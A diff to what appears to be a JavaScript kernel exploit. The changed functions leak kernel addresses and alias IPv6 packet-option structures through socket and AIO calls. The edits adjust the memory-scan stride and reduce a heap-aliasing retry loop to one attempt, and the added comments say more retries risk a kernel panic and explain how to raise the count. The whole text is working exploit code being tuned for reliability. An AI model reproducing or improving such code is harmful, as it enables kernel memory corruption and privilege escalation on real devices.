@@ -3199,7 +3199,7 @@ function leak_kernel_addrs(sd_pair) {
       AIO_CMD_WRITE
     );
     get_rthdr(sd, buf);
-    for (let off = 0x80; off < buf.length; off += 0x80) {
+    for (let off = 0x80; off < buf.length; off += 0x40) {
       if (verify_reqs2(buf, off)) {
         reqs2_off = off;
         //log(`found reqs2 at attempt: ${i}`);
@@ -3254,7 +3254,12 @@ function leak_kernel_addrs(sd_pair) {
 //================================================================================================
 function make_aliased_pktopts(sds) {
   const tclass = new Word();
-  for (let loop = 0; loop < num_alias; loop++) {
+  // Single attempt only - multi-retry loop removed per upstream fix.
+  // Multiple retries can trigger kernel panic or immediate hard shutdown.
+  // If this fails, restart from the system menu and retry.
+  // To increase retry count, change pktopts_loopcnt to a higher value.
+  const pktopts_loopcnt = 1;
+  for (let loop = 0; loop < pktopts_loopcnt; loop++) {
     for (let i = 0; i < num_sds; i++) {
       setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
     }
